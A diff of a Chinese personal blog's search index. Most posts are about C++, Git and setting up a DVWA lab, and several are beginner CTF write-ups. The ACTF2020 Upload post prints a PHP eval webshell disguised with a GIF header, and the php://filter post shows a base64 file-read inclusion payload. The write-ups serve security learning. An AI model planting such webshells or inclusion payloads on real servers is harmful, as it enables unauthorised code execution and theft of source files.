@@ -1,6 +1,41 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
+    <title>ACTF2020 新生赛 Upload</title>
+    <url>/2021/12/02/ACTF2020-%E6%96%B0%E7%94%9F%E8%B5%9B-Upload/</url>
+    <content><![CDATA[<p>同样是一道上传题，上传已有木马</p>
+<p><img src="/2021/12/02/ACTF2020-%E6%96%B0%E7%94%9F%E8%B5%9B-Upload/image-20211202162637320.png" alt="image-20211202162637320"></p>
+<span id="more"></span>
+
+<p>换gif木马重新尝试</p>
+<p><img src="/2021/12/02/ACTF2020-%E6%96%B0%E7%94%9F%E8%B5%9B-Upload/image-20211202162755354.png" alt="image-20211202162755354"></p>
+<p>上传成功，打开指定网址查看是否有上传文件</p>
+<p><img src="/2021/12/02/ACTF2020-%E6%96%B0%E7%94%9F%E8%B5%9B-Upload/image-20211202162849704.png" alt="image-20211202162849704"></p>
+<p>果然有</p>
+<p><img src="/2021/12/02/ACTF2020-%E6%96%B0%E7%94%9F%E8%B5%9B-Upload/image-20211202162906119.png" alt="image-20211202162906119"></p>
+<p>接着打开蚁剑连接，发现</p>
+<p><strong><u>上传的图片中的代码不能用</u></strong></p>
+<p>换方法</p>
+<p>随便上传一个图片，然后修改其后缀和内容</p>
+<p><img src="/2021/12/02/ACTF2020-%E6%96%B0%E7%94%9F%E8%B5%9B-Upload/image-20211202173541721.png" alt="image-20211202173541721"></p>
+<p>改为php后，不通过，则改为phtml</p>
+<p>并插入代码</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">GIF89a? &lt;script language=<span class="string">&quot;php&quot;</span>&gt;<span class="keyword">eval</span>(<span class="variable">$_REQUEST</span>[<span class="number">1</span>])&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+
+<p>如图</p>
+<p><img src="/2021/12/02/ACTF2020-%E6%96%B0%E7%94%9F%E8%B5%9B-Upload/image-20211202173720354.png" alt="image-20211202173720354"></p>
+<p>提交后</p>
+<p><img src="/2021/12/02/ACTF2020-%E6%96%B0%E7%94%9F%E8%B5%9B-Upload/image-20211202173743862.png" alt="image-20211202173743862"></p>
+<p>进入蚁剑连接</p>
+<p><img src="/2021/12/02/ACTF2020-%E6%96%B0%E7%94%9F%E8%B5%9B-Upload/image-20211202173834016.png" alt="image-20211202173834016"></p>
+<p>在根目录下得到flag</p>
+<p><img src="/2021/12/02/ACTF2020-%E6%96%B0%E7%94%9F%E8%B5%9B-Upload/image-20211202173912850.png" alt="image-20211202173912850"></p>
+]]></content>
+      <tags>
+        <tag>webshell</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>C++中的循环结构和跳转语句</title>
     <url>/2021/12/16/C-%E4%B8%AD%E7%9A%84%E5%BE%AA%E7%8E%AF%E7%BB%93%E6%9E%84/</url>
     <content><![CDATA[<h1 id="一、循环结构"><a href="#一、循环结构" class="headerlink" title="一、循环结构"></a>一、循环结构</h1><h2 id="1-while循环结构"><a href="#1-while循环结构" class="headerlink" title="1.while循环结构"></a>1.while循环结构</h2><p>作用：满足循环条件，执行循环语句</p>
@@ -45,41 +80,6 @@
 ]]></content>
       <tags>
         <tag>C++</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>ACTF2020 新生赛 Upload</title>
-    <url>/2021/12/02/ACTF2020-%E6%96%B0%E7%94%9F%E8%B5%9B-Upload/</url>
-    <content><![CDATA[<p>同样是一道上传题，上传已有木马</p>
-<p><img src="/2021/12/02/ACTF2020-%E6%96%B0%E7%94%9F%E8%B5%9B-Upload/image-20211202162637320.png" alt="image-20211202162637320"></p>
-<span id="more"></span>
-
-<p>换gif木马重新尝试</p>
-<p><img src="/2021/12/02/ACTF2020-%E6%96%B0%E7%94%9F%E8%B5%9B-Upload/image-20211202162755354.png" alt="image-20211202162755354"></p>
-<p>上传成功，打开指定网址查看是否有上传文件</p>
-<p><img src="/2021/12/02/ACTF2020-%E6%96%B0%E7%94%9F%E8%B5%9B-Upload/image-20211202162849704.png" alt="image-20211202162849704"></p>
-<p>果然有</p>
-<p><img src="/2021/12/02/ACTF2020-%E6%96%B0%E7%94%9F%E8%B5%9B-Upload/image-20211202162906119.png" alt="image-20211202162906119"></p>
-<p>接着打开蚁剑连接，发现</p>
-<p><strong><u>上传的图片中的代码不能用</u></strong></p>
-<p>换方法</p>
-<p>随便上传一个图片，然后修改其后缀和内容</p>
-<p><img src="/2021/12/02/ACTF2020-%E6%96%B0%E7%94%9F%E8%B5%9B-Upload/image-20211202173541721.png" alt="image-20211202173541721"></p>
-<p>改为php后，不通过，则改为phtml</p>
-<p>并插入代码</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">GIF89a? &lt;script language=<span class="string">&quot;php&quot;</span>&gt;<span class="keyword">eval</span>(<span class="variable">$_REQUEST</span>[<span class="number">1</span>])&lt;/script&gt;</span><br></pre></td></tr></table></figure>
-
-<p>如图</p>
-<p><img src="/2021/12/02/ACTF2020-%E6%96%B0%E7%94%9F%E8%B5%9B-Upload/image-20211202173720354.png" alt="image-20211202173720354"></p>
-<p>提交后</p>
-<p><img src="/2021/12/02/ACTF2020-%E6%96%B0%E7%94%9F%E8%B5%9B-Upload/image-20211202173743862.png" alt="image-20211202173743862"></p>
-<p>进入蚁剑连接</p>
-<p><img src="/2021/12/02/ACTF2020-%E6%96%B0%E7%94%9F%E8%B5%9B-Upload/image-20211202173834016.png" alt="image-20211202173834016"></p>
-<p>在根目录下得到flag</p>
-<p><img src="/2021/12/02/ACTF2020-%E6%96%B0%E7%94%9F%E8%B5%9B-Upload/image-20211202173912850.png" alt="image-20211202173912850"></p>
-]]></content>
-      <tags>
-        <tag>webshell</tag>
       </tags>
   </entry>
   <entry>
@@ -340,40 +340,6 @@
       </tags>
   </entry>
   <entry>
-    <title>PHPstudy+Win7搭建ＤＶＷＡ靶场</title>
-    <url>/2021/12/11/PHPstudy-Win7%E6%90%AD%E5%BB%BADVWA%E9%9D%B6%E5%9C%BA/</url>
-    <content><![CDATA[<h1 id="1-安装虚拟机"><a href="#1-安装虚拟机" class="headerlink" title="1.安装虚拟机"></a>1.安装虚拟机</h1><p>这里我用的时VMware，可以直接百度搜索，然后下载即可。之后要去找一个Win7的系统静像，这里推荐去<a href="https://msdn.itellyou.cn/"> I Tell You</a>下载。然后就是配置虚拟机</p>
-<span id="more"></span>
-
-<p><img src="/2021/12/11/PHPstudy-Win7%E6%90%AD%E5%BB%BADVWA%E9%9D%B6%E5%9C%BA/image-20211211174106598.png" alt="image-20211211174106598"></p>
-<p>点击创建新的虚拟机，然后选定刚才下载的Win7静像，即可创建。创建完成后要进行VMware Tools的安装（目的是要实现与物理机的粘贴与复制），打开此处的设置</p>
-<p><img src="/2021/12/11/PHPstudy-Win7%E6%90%AD%E5%BB%BADVWA%E9%9D%B6%E5%9C%BA/image-20211211174722062.png" alt="image-20211211174722062"></p>
-<p>这里要将CD和软盘的连接都设置为 使用物理驱动器 </p>
-<p><img src="/2021/12/11/PHPstudy-Win7%E6%90%AD%E5%BB%BADVWA%E9%9D%B6%E5%9C%BA/image-20211211174757258.png" alt="image-20211211174757258"></p>
-<p>然后进行VMware Tools的安装（如果不设置无法安装）。这里建议安装后为系统拍摄快照。</p>
-<h1 id="2-安装PHPstudy和DVWA"><a href="#2-安装PHPstudy和DVWA" class="headerlink" title="2.安装PHPstudy和DVWA"></a>2.安装PHPstudy和DVWA</h1><p>安装之后直接直接在浏览器里面下载phpstudy，之后安装以下套件</p>
-<p><img src="/2021/12/11/PHPstudy-Win7%E6%90%AD%E5%BB%BADVWA%E9%9D%B6%E5%9C%BA/image-20211211181907791.png" alt="image-20211211181907791"></p>
-<p>然后找到以下文件夹</p>
-<p><img src="/2021/12/11/PHPstudy-Win7%E6%90%AD%E5%BB%BADVWA%E9%9D%B6%E5%9C%BA/image-20211211182353767.png" alt="image-20211211182353767"></p>
-<p>将事先下载好的DVWA-master文件夹移入，然后打开文件夹的如下位置</p>
-<p><img src="/2021/12/11/PHPstudy-Win7%E6%90%AD%E5%BB%BADVWA%E9%9D%B6%E5%9C%BA/image-20211211182626782.png" alt="image-20211211182626782"></p>
-<p>并将里面文件复制后去掉.dist保存，再将其打开，修改其中数据：</p>
-<p><img src="/2021/12/11/PHPstudy-Win7%E6%90%AD%E5%BB%BADVWA%E9%9D%B6%E5%9C%BA/image-20211211182721061.png" alt="image-20211211182721061"></p>
-<p><img src="/2021/12/11/PHPstudy-Win7%E6%90%AD%E5%BB%BADVWA%E9%9D%B6%E5%9C%BA/image-20211211182928405.png" alt="image-20211211182928405"></p>
-<p>然后在浏览器中输入地址 ：<a href="http://127.0.0.1/DVWA-master/setup.php">http://127.0.0.1/DVWA-master/setup.php</a></p>
-<p>拉到最下面点击按钮</p>
-<p><img src="/2021/12/11/PHPstudy-Win7%E6%90%AD%E5%BB%BADVWA%E9%9D%B6%E5%9C%BA/image-20211211182947997.png" alt="image-20211211182947997"></p>
-<p>之后进入登录页面</p>
-<p><img src="/2021/12/11/PHPstudy-Win7%E6%90%AD%E5%BB%BADVWA%E9%9D%B6%E5%9C%BA/image-20211211183019265.png" alt="image-20211211183019265"></p>
-<p>账号：admin</p>
-<p>密码：password</p>
-<p>登录成功后即可进入</p>
-]]></content>
-      <tags>
-        <tag>PHPstudy</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>C++运算符</title>
     <url>/2021/12/10/C-%E8%BF%90%E7%AE%97%E7%AC%A6/</url>
     <content><![CDATA[<h1 id="1-运算符类型"><a href="#1-运算符类型" class="headerlink" title="1.运算符类型"></a>1.运算符类型</h1><p>运算运算符：用于四则运算</p>
@@ -603,6 +569,40 @@
       </tags>
   </entry>
   <entry>
+    <title>PHPstudy+Win7搭建ＤＶＷＡ靶场</title>
+    <url>/2021/12/11/PHPstudy-Win7%E6%90%AD%E5%BB%BADVWA%E9%9D%B6%E5%9C%BA/</url>
+    <content><![CDATA[<h1 id="1-安装虚拟机"><a href="#1-安装虚拟机" class="headerlink" title="1.安装虚拟机"></a>1.安装虚拟机</h1><p>这里我用的时VMware，可以直接百度搜索，然后下载即可。之后要去找一个Win7的系统静像，这里推荐去<a href="https://msdn.itellyou.cn/"> I Tell You</a>下载。然后就是配置虚拟机</p>
+<span id="more"></span>
+
+<p><img src="/2021/12/11/PHPstudy-Win7%E6%90%AD%E5%BB%BADVWA%E9%9D%B6%E5%9C%BA/image-20211211174106598.png" alt="image-20211211174106598"></p>
+<p>点击创建新的虚拟机，然后选定刚才下载的Win7静像，即可创建。创建完成后要进行VMware Tools的安装（目的是要实现与物理机的粘贴与复制），打开此处的设置</p>
+<p><img src="/2021/12/11/PHPstudy-Win7%E6%90%AD%E5%BB%BADVWA%E9%9D%B6%E5%9C%BA/image-20211211174722062.png" alt="image-20211211174722062"></p>
+<p>这里要将CD和软盘的连接都设置为 使用物理驱动器 </p>
+<p><img src="/2021/12/11/PHPstudy-Win7%E6%90%AD%E5%BB%BADVWA%E9%9D%B6%E5%9C%BA/image-20211211174757258.png" alt="image-20211211174757258"></p>
+<p>然后进行VMware Tools的安装（如果不设置无法安装）。这里建议安装后为系统拍摄快照。</p>
+<h1 id="2-安装PHPstudy和DVWA"><a href="#2-安装PHPstudy和DVWA" class="headerlink" title="2.安装PHPstudy和DVWA"></a>2.安装PHPstudy和DVWA</h1><p>安装之后直接直接在浏览器里面下载phpstudy，之后安装以下套件</p>
+<p><img src="/2021/12/11/PHPstudy-Win7%E6%90%AD%E5%BB%BADVWA%E9%9D%B6%E5%9C%BA/image-20211211181907791.png" alt="image-20211211181907791"></p>
+<p>然后找到以下文件夹</p>
+<p><img src="/2021/12/11/PHPstudy-Win7%E6%90%AD%E5%BB%BADVWA%E9%9D%B6%E5%9C%BA/image-20211211182353767.png" alt="image-20211211182353767"></p>
+<p>将事先下载好的DVWA-master文件夹移入，然后打开文件夹的如下位置</p>
+<p><img src="/2021/12/11/PHPstudy-Win7%E6%90%AD%E5%BB%BADVWA%E9%9D%B6%E5%9C%BA/image-20211211182626782.png" alt="image-20211211182626782"></p>
+<p>并将里面文件复制后去掉.dist保存，再将其打开，修改其中数据：</p>
+<p><img src="/2021/12/11/PHPstudy-Win7%E6%90%AD%E5%BB%BADVWA%E9%9D%B6%E5%9C%BA/image-20211211182721061.png" alt="image-20211211182721061"></p>
+<p><img src="/2021/12/11/PHPstudy-Win7%E6%90%AD%E5%BB%BADVWA%E9%9D%B6%E5%9C%BA/image-20211211182928405.png" alt="image-20211211182928405"></p>
+<p>然后在浏览器中输入地址 ：<a href="http://127.0.0.1/DVWA-master/setup.php">http://127.0.0.1/DVWA-master/setup.php</a></p>
+<p>拉到最下面点击按钮</p>
+<p><img src="/2021/12/11/PHPstudy-Win7%E6%90%AD%E5%BB%BADVWA%E9%9D%B6%E5%9C%BA/image-20211211182947997.png" alt="image-20211211182947997"></p>
+<p>之后进入登录页面</p>
+<p><img src="/2021/12/11/PHPstudy-Win7%E6%90%AD%E5%BB%BADVWA%E9%9D%B6%E5%9C%BA/image-20211211183019265.png" alt="image-20211211183019265"></p>
+<p>账号：admin</p>
+<p>密码：password</p>
+<p>登录成功后即可进入</p>
+]]></content>
+      <tags>
+        <tag>PHPstudy</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>bugku-bp</title>
     <url>/2021/12/05/bugku-bp/</url>
     <content><![CDATA[<p>根据题目提示，要用top1000密码</p>
@@ -623,27 +623,99 @@
       </tags>
   </entry>
   <entry>
-    <title>php://filter 协议</title>
-    <url>/2021/12/05/php-filter-%E5%8D%8F%E8%AE%AE/</url>
-    <content><![CDATA[<h1 id="php-filter-协议"><a href="#php-filter-协议" class="headerlink" title="php://filter 协议"></a>php://filter 协议</h1><p><img src="/2021/12/05/php-filter-%E5%8D%8F%E8%AE%AE/20210711135416691.png" alt="asd"></p>
-<p>1是格式<br>2是可选参数，有read和write，字面意思就是读和写（如果不写可选参数2(read或write)，那么网页会自动匹配一个合适的read或write）<br>3是过滤器。主要有四种：字符串过滤器，转换过滤器，压缩过滤器，加密过滤器。filter里可以用一或多个过滤器（中间用|隔开），这也为解题提供了多种方法，灵活运用过滤器是解题的关键。这里的过滤器是把文件flag.php里的代码转换（convert）为base64编码（encode）<br>4是必选参数，后面写你要处理的文件名<br>常用过滤器</p>
-<span id="more"></span>
-
-<p>转base64编码：convert.base64-encode</p>
-<p>转大写：string.toupper</p>
-<p>php://filter还可以绕过，大概就是把不希望执行的语句先编码，这个编码类型可以破坏语句的正常执行<br>（比如base64编码只有64个字符，如果被编码的语句字符在64个字符里找不到对应的，就会忽略，略过它继续编码），然后再解码，这样就可以绕过这个语句了。</p>
-<p>例题：</p>
-<h1 id="ACTF2020-新生赛Include"><a href="#ACTF2020-新生赛Include" class="headerlink" title="ACTF2020 新生赛Include"></a>ACTF2020 新生赛Include</h1><p>打开题目后审视代码，发现啥也没有</p>
-<p><img src="/2021/12/05/php-filter-%E5%8D%8F%E8%AE%AE/image-20211205170041509.png" alt="image-20211205170041509"></p>
-<p>但看到php文件，可以联想文件包含漏洞，然后我们可以用php://filter协议来查看源文件内容。</p>
-<p>构造：php://filter/read=convert.base64-encode/recource=flag.php</p>
-<p><img src="/2021/12/05/php-filter-%E5%8D%8F%E8%AE%AE/image-20211205170421228.png" alt="image-20211205170421228"></p>
-<p>这句话的意思是我们用base64编码的方式来读文件flag.php；这时页面会显示出源文件flag.php经过base64编码后的内容</p>
-<p><img src="/2021/12/05/php-filter-%E5%8D%8F%E8%AE%AE/image-20211205170455351.png" alt="image-20211205170455351"></p>
-<p>然后经过base64解码就可以看到flag<br><img src="/2021/12/05/php-filter-%E5%8D%8F%E8%AE%AE/image-20211205170507361.png" alt="image-20211205170507361"></p>
+    <title>Git的介绍、安装和基本提交</title>
+    <url>/2022/01/08/git%E4%BB%8B%E7%BB%8D%E5%AE%89%E8%A3%85%E5%92%8C%E6%8F%90%E4%BA%A4/</url>
+    <content><![CDATA[<h1 id="Git的优势"><a href="#Git的优势" class="headerlink" title="Git的优势"></a>Git的优势</h1><ul>
+<li><p>大部分操作在本地完成，不需要连接互联网</p>
+</li>
+<li><p>完整性保证（利用Hash值）</p>
+</li>
+<li><p>尽可能添加数据而不是删除数据或修改数据，从而避免了不可逆操作（为每个版本拍摄快照）</p>
+</li>
+<li><p>分支操作非常快捷流畅</p>
+</li>
+<li><p>与Linux命令全面兼容（二者是一个爹）</p>
+<span id="more"></span></li>
+</ul>
+<h1 id="Git的安装"><a href="#Git的安装" class="headerlink" title="Git的安装"></a>Git的安装</h1><p>首先去<a href="https://git-scm.com/download/win">git官网下载</a>并根据自己电脑的位数选择相应的版本</p>
+<p><img src="/2022/01/08/git%E4%BB%8B%E7%BB%8D%E5%AE%89%E8%A3%85%E5%92%8C%E6%8F%90%E4%BA%A4/image-20220108191953930.png" alt="image-20220108191953930"></p>
+<p>下载完成后安装，选择一个非中文没有空格的目录</p>
+<p><img src="/2022/01/08/git%E4%BB%8B%E7%BB%8D%E5%AE%89%E8%A3%85%E5%92%8C%E6%8F%90%E4%BA%A4/image-20220108192101316.png" alt="image-20220108192101316"></p>
+<p>然后下一步，按照下面图片的选项即可</p>
+<p><img src="/2022/01/08/git%E4%BB%8B%E7%BB%8D%E5%AE%89%E8%A3%85%E5%92%8C%E6%8F%90%E4%BA%A4/image-20220108192700075.png" alt="image-20220108192700075"></p>
+<p><img src="/2022/01/08/git%E4%BB%8B%E7%BB%8D%E5%AE%89%E8%A3%85%E5%92%8C%E6%8F%90%E4%BA%A4/image-20220108192807726.png" alt="image-20220108192807726"></p>
+<p><img src="/2022/01/08/git%E4%BB%8B%E7%BB%8D%E5%AE%89%E8%A3%85%E5%92%8C%E6%8F%90%E4%BA%A4/image-20220108192853679.png" alt="image-20220108192853679"></p>
+<p><img src="/2022/01/08/git%E4%BB%8B%E7%BB%8D%E5%AE%89%E8%A3%85%E5%92%8C%E6%8F%90%E4%BA%A4/image-20220108193229371.png" alt="image-20220108193229371"></p>
+<p><img src="/2022/01/08/git%E4%BB%8B%E7%BB%8D%E5%AE%89%E8%A3%85%E5%92%8C%E6%8F%90%E4%BA%A4/image-20220108193435463.png" alt="image-20220108193435463"></p>
+<p><img src="/2022/01/08/git%E4%BB%8B%E7%BB%8D%E5%AE%89%E8%A3%85%E5%92%8C%E6%8F%90%E4%BA%A4/image-20220108193655903.png" alt="image-20220108193655903"></p>
+<p><img src="/2022/01/08/git%E4%BB%8B%E7%BB%8D%E5%AE%89%E8%A3%85%E5%92%8C%E6%8F%90%E4%BA%A4/image-20220108193801302.png" alt="image-20220108193801302"></p>
+<p><img src="/2022/01/08/git%E4%BB%8B%E7%BB%8D%E5%AE%89%E8%A3%85%E5%92%8C%E6%8F%90%E4%BA%A4/image-20220108193945547.png" alt="image-20220108193945547"></p>
+<p>然后安装即可，装完效果如下</p>
+<p><img src="/2022/01/08/git%E4%BB%8B%E7%BB%8D%E5%AE%89%E8%A3%85%E5%92%8C%E6%8F%90%E4%BA%A4/image-20220108194259961.png" alt="image-20220108194259961"></p>
+<h1 id="Git在本地的结构"><a href="#Git在本地的结构" class="headerlink" title="Git在本地的结构"></a>Git在本地的结构</h1><p><img src="/2022/01/08/git%E4%BB%8B%E7%BB%8D%E5%AE%89%E8%A3%85%E5%92%8C%E6%8F%90%E4%BA%A4/image-20220108194609170.png" alt="image-20220108194609170"></p>
+<h1 id="Git和代码托管中心"><a href="#Git和代码托管中心" class="headerlink" title="Git和代码托管中心"></a>Git和代码托管中心</h1><p>代码托管中心有很多，如外网环境下的GitHub、码云，局域网里的GitLab服务器（Git和Github的历史发展没有渊源）代码托管中心的任务是维护远程库</p>
+<h1 id="Git的本地库和远程库的交互"><a href="#Git的本地库和远程库的交互" class="headerlink" title="Git的本地库和远程库的交互"></a>Git的本地库和远程库的交互</h1><p>团队内协作（不加入团队不可push修改远程库代码）</p>
+<p><img src="/2022/01/08/git%E4%BB%8B%E7%BB%8D%E5%AE%89%E8%A3%85%E5%92%8C%E6%8F%90%E4%BA%A4/image-20220108202115421.png" alt="image-20220108202115421"></p>
+<p>跨团队协作</p>
+<p><img src="/2022/01/08/git%E4%BB%8B%E7%BB%8D%E5%AE%89%E8%A3%85%E5%92%8C%E6%8F%90%E4%BA%A4/image-20220108211729222.png" alt="image-20220108211729222"></p>
+<h1 id="Git命令行操作"><a href="#Git命令行操作" class="headerlink" title="Git命令行操作"></a>Git命令行操作</h1><h2 id="本地库操作"><a href="#本地库操作" class="headerlink" title="本地库操作"></a>本地库操作</h2><h3 id="本地库初始化"><a href="#本地库初始化" class="headerlink" title="本地库初始化"></a>本地库初始化</h3><p>命令：<code>git init</code></p>
+<p>效果：<img src="/2022/01/08/git%E4%BB%8B%E7%BB%8D%E5%AE%89%E8%A3%85%E5%92%8C%E6%8F%90%E4%BA%A4/image-20220108212311272.png" alt="image-20220108212311272"></p>
+<p>注意：.git目录中存放的是本地库相关的子目录和文件，不要删除和修改</p>
+<h3 id="设置签名"><a href="#设置签名" class="headerlink" title="设置签名"></a>设置签名</h3><p>形式：</p>
+<p>用户名：随便输</p>
+<p>Email地址：随便输，不存在也没关系</p>
+<p>作用：区分不同开发人员</p>
+<p>辨析：这里设置的签名和远程库（代码托管中心）的账号和密码一点关系没有</p>
+<p>命令：<code>git config user.name 用户名</code>  </p>
+<p>​        ：<code>git config user.email 邮件地址</code>    项目级别</p>
+<p>​        ：<code>git config --global user.name 用户名</code></p>
+<p>​         :  <code>git config --global user.email 邮件地址</code>    系统用户级别</p>
+<p><img src="/2022/01/08/git%E4%BB%8B%E7%BB%8D%E5%AE%89%E8%A3%85%E5%92%8C%E6%8F%90%E4%BA%A4/image-20220108214655319.png" alt="image-20220108214655319"></p>
+<p>项目级别/仓库级别：仅在当前本地库范围内有效（即只在test文件夹内有效）</p>
+<p>系统用户级别：登录当前操作系统的用户范围，如图</p>
+<p><img src="/2022/01/08/git%E4%BB%8B%E7%BB%8D%E5%AE%89%E8%A3%85%E5%92%8C%E6%8F%90%E4%BA%A4/image-20220108213618080.png" alt="image-20220108213618080"></p>
+<p>若没设置，则默认是系统用户级别，若两个都有，则是项目级别。也就是项目级别优先于系统用户级别。</p>
+<p>若二者都没有是不允许的</p>
+<p>项目级别用户名和邮件地址保存在.git/config里面，如上图</p>
+<p>系统用户级别用户名和邮件地址保存在当前用户文件夹里，如图</p>
+<p><img src="/2022/01/08/git%E4%BB%8B%E7%BB%8D%E5%AE%89%E8%A3%85%E5%92%8C%E6%8F%90%E4%BA%A4/image-20220108215432512.png" alt="image-20220108215432512"></p>
+<p>通常只设置一个系统用户级别</p>
+<h3 id="添加提交和查看状态操作"><a href="#添加提交和查看状态操作" class="headerlink" title="添加提交和查看状态操作"></a>添加提交和查看状态操作</h3><p>查看当前库状态命令：<code>git status</code></p>
+<p><img src="/2022/01/08/git%E4%BB%8B%E7%BB%8D%E5%AE%89%E8%A3%85%E5%92%8C%E6%8F%90%E4%BA%A4/image-20220108220013324.png" alt="image-20220108220013324"></p>
+<p>创建文件命令：<code>vim 文件名.文件类型</code>（创建后即使未提交，在windows文件夹中也可看到该文件）</p>
+<p><img src="/2022/01/08/git%E4%BB%8B%E7%BB%8D%E5%AE%89%E8%A3%85%E5%92%8C%E6%8F%90%E4%BA%A4/image-20220108220229743.png" alt="image-20220108220229743"></p>
+<p><img src="/2022/01/08/git%E4%BB%8B%E7%BB%8D%E5%AE%89%E8%A3%85%E5%92%8C%E6%8F%90%E4%BA%A4/image-20220108220240175.png" alt="image-20220108220240175"></p>
+<p>按I键开始输入内容</p>
+<p><img src="/2022/01/08/git%E4%BB%8B%E7%BB%8D%E5%AE%89%E8%A3%85%E5%92%8C%E6%8F%90%E4%BA%A4/image-20220108220517621.png" alt="image-20220108220517621"></p>
+<p>编辑完成后按ESC然后输入<code>:wq</code>退出</p>
+<p>此时再输入<code>git status</code>可看到</p>
+<p><img src="/2022/01/08/git%E4%BB%8B%E7%BB%8D%E5%AE%89%E8%A3%85%E5%92%8C%E6%8F%90%E4%BA%A4/image-20220108221241830.png" alt="image-20220108221241830"></p>
+<p>将工作区文件放入暂存区命令：<code>git add 文件名.文件类型</code></p>
+<p><img src="/2022/01/08/git%E4%BB%8B%E7%BB%8D%E5%AE%89%E8%A3%85%E5%92%8C%E6%8F%90%E4%BA%A4/image-20220108221653353.png" alt="image-20220108221653353"></p>
+<p><img src="/2022/01/08/git%E4%BB%8B%E7%BB%8D%E5%AE%89%E8%A3%85%E5%92%8C%E6%8F%90%E4%BA%A4/image-20220108193655903.png" alt="image-20220108193655903"></p>
+<p>放进去后，在用<code>git status</code>看一下状态，可知test.txt已经进入暂存区</p>
+<p><img src="/2022/01/08/git%E4%BB%8B%E7%BB%8D%E5%AE%89%E8%A3%85%E5%92%8C%E6%8F%90%E4%BA%A4/image-20220108222245958.png" alt="image-20220108222245958"></p>
+<p>若使用<code>git rm --cached test.txt</code>则又回到此状态</p>
+<p><img src="/2022/01/08/git%E4%BB%8B%E7%BB%8D%E5%AE%89%E8%A3%85%E5%92%8C%E6%8F%90%E4%BA%A4/image-20220108221241830.png" alt="image-20220108221241830"></p>
+<p>将暂存区文件提交到本地库命令：<code>git commit 文件名.文件类型</code></p>
+<p>vim编辑器中输入<code>:set nu</code>来查看行号</p>
+<p><img src="/2022/01/08/git%E4%BB%8B%E7%BB%8D%E5%AE%89%E8%A3%85%E5%92%8C%E6%8F%90%E4%BA%A4/image-20220108222950393.png" alt="image-20220108222950393"></p>
+<p>然后按I键来进行输入更改备注信息</p>
+<p>输入好后按ESC然后输入<code>:wq</code>退出</p>
+<p><img src="/2022/01/08/git%E4%BB%8B%E7%BB%8D%E5%AE%89%E8%A3%85%E5%92%8C%E6%8F%90%E4%BA%A4/image-20220108223450538.png" alt="image-20220108223450538"></p>
+<p>然后再看一下状态</p>
+<p><img src="/2022/01/08/git%E4%BB%8B%E7%BB%8D%E5%AE%89%E8%A3%85%E5%92%8C%E6%8F%90%E4%BA%A4/image-20220108223535612.png" alt="image-20220108223535612"></p>
+<p>利用<code>git commit --amend - “新的备注”</code>来更改备注信息，并用<code>git log</code>来查看历史版本</p>
+<p><img src="/2022/01/08/git%E4%BB%8B%E7%BB%8D%E5%AE%89%E8%A3%85%E5%92%8C%E6%8F%90%E4%BA%A4/image-20220108224049105.png" alt="image-20220108224049105"></p>
+<p>用<code>vim test.txt</code>继续编辑文件，加入一行“d”然后再查看状态</p>
+<p><img src="/2022/01/08/git%E4%BB%8B%E7%BB%8D%E5%AE%89%E8%A3%85%E5%92%8C%E6%8F%90%E4%BA%A4/image-20220108224800559.png" alt="image-20220108224800559"></p>
+<p>这里用<code>git add test.txt</code>按部就班的进行提交，然后查看状态</p>
+<p><img src="/2022/01/08/git%E4%BB%8B%E7%BB%8D%E5%AE%89%E8%A3%85%E5%92%8C%E6%8F%90%E4%BA%A4/image-20220108225112194.png" alt="image-20220108225112194"></p>
+<p>然后进行提交，这里用<code>git commit -m &quot;备注&quot; test.txt</code>进行提交，不用再在vim编辑器里输入备注信息</p>
+<p><img src="/2022/01/08/git%E4%BB%8B%E7%BB%8D%E5%AE%89%E8%A3%85%E5%92%8C%E6%8F%90%E4%BA%A4/image-20220108225410302.png" alt="image-20220108225410302"></p>
 ]]></content>
       <tags>
-        <tag>php Filter</tag>
+        <tag>Git</tag>
       </tags>
   </entry>
   <entry>
@@ -750,19 +822,27 @@
       </tags>
   </entry>
   <entry>
-    <title>极客大挑战 2019Havefun</title>
-    <url>/2021/12/05/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98%202019Havefun/</url>
-    <content><![CDATA[<p>打开题目后啥也没有，按F12查看代码，发现线索</p>
-<p><img src="/2021/12/05/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98%202019Havefun/image-20211205161615155.png" alt="image-20211205161615155"></p>
+    <title>php://filter 协议</title>
+    <url>/2021/12/05/php-filter-%E5%8D%8F%E8%AE%AE/</url>
+    <content><![CDATA[<h1 id="php-filter-协议"><a href="#php-filter-协议" class="headerlink" title="php://filter 协议"></a>php://filter 协议</h1><p><img src="/2021/12/05/php-filter-%E5%8D%8F%E8%AE%AE/20210711135416691.png" alt="asd"></p>
+<p>1是格式<br>2是可选参数，有read和write，字面意思就是读和写（如果不写可选参数2(read或write)，那么网页会自动匹配一个合适的read或write）<br>3是过滤器。主要有四种：字符串过滤器，转换过滤器，压缩过滤器，加密过滤器。filter里可以用一或多个过滤器（中间用|隔开），这也为解题提供了多种方法，灵活运用过滤器是解题的关键。这里的过滤器是把文件flag.php里的代码转换（convert）为base64编码（encode）<br>4是必选参数，后面写你要处理的文件名<br>常用过滤器</p>
 <span id="more"></span>
 
-<p>很明显要用GET的方式让cat=dog</p>
-<p><img src="/2021/12/05/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98%202019Havefun/image-20211205161708933.png" alt="image-20211205161708933"></p>
-<p>进入后得到flag</p>
-<p><img src="/2021/12/05/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98%202019Havefun/image-20211205161730917.png" alt="image-20211205161730917"></p>
+<p>转base64编码：convert.base64-encode</p>
+<p>转大写：string.toupper</p>
+<p>php://filter还可以绕过，大概就是把不希望执行的语句先编码，这个编码类型可以破坏语句的正常执行<br>（比如base64编码只有64个字符，如果被编码的语句字符在64个字符里找不到对应的，就会忽略，略过它继续编码），然后再解码，这样就可以绕过这个语句了。</p>
+<p>例题：</p>
+<h1 id="ACTF2020-新生赛Include"><a href="#ACTF2020-新生赛Include" class="headerlink" title="ACTF2020 新生赛Include"></a>ACTF2020 新生赛Include</h1><p>打开题目后审视代码，发现啥也没有</p>
